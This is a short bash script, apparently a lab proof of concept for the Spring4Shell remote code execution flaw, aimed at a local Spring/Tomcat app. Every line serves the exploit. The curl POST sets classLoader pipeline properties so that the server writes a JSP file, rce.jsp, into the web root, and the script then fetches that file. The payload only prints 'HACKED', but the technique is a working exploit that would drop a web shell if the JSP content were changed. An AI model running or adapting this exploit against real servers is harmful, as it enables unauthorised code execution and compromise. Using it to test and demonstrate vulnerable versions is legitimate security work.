#! /bin/bash
set -ex
site="http://localhost:8080"
app="handling-form-submission-complete"
appurl="${site}/${app}"
curl -X POST -w '\n' \
  -H "pre:<%" \
  -H "post:;%>" \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{pre}i out.println("HACKED")%{post}i' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp' \
  -F "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/${app}" \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.prefix=rce' \
  -F 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=' \
  "${appurl}/greeting"

sleep 5

curl -w '\n' "${appurl}/rce.jsp"

